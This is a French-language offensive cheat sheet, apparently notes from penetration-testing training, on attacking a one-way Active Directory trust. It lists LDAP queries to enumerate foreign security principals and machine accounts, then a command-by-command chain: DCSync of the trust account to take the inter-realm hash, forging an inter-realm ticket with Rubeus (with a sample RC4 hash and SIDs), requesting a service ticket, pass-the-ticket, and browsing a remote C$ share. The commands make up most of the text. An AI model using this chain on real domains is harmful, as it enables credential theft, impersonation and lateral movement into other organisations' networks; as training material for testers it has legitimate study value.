
Le domaine cible nous fait confiance, mais pas l'inverse


- [[#Enumeration]]
- [[#Forge de silver tickets]]

# Enumeration




1. Identifier les ForeignSecurityPrincipals (comptes digne de confiance pour le domaine cible)

ignorer `S-1-5-4`, `S-1-5-9`, `S-1-5-11`, et `S-1-5-17`.

```
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
```

2. Identifier les infos de comptes identifiés

```
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
```

3. Identifier les comptes de machines du domaine cible

```
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
```

4. Usurper le compte autorisé et énumérer le domaine cible  (Réénumérer tout l'AD -> [[1. LDAP]], rechercher kerberoasting, asrep-roasting...)


---
# Forge de silver tickets

- `/user` is the username to impersonate.
    
- `/domain` is the FQDN of the trusted domain.
    
- `/sid` is the SID of the trusted domain. 
    
- `/id` is the RID of the impersonated user.
    
- `/groups` are the RIDs of the impersonated user's domain groups.  _Domain Users_ is 513, _Workstation Admins_ is 1106, and _Partner Jump Users_ is 6102.
    
- `/service` is the krbtgt service of the trusting domain.
    
- `/rc4` is the inter-realm key.


1. DCSync le trusted Account afin de récupérer le hash NTLM (préféré à l'AES dans le cas des trusts) de l'inter-realm.

```
dcsync contoso.com CONTOSO\PARTNER$
```

2. Forger un silver ticket offline

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

3. Demander un TGS depuis une session grâce au ticket forgé

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:<dc_trusting_domain> /ticket:doIFM[...snip...]mNvbQ== /nowrap
```

4. Pass the ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]
```

5. vérifier le ticket en cache

```
run klist
```

5. Enumérer le service cible

```
ls \\par-jmp-1.partner.com\c$
```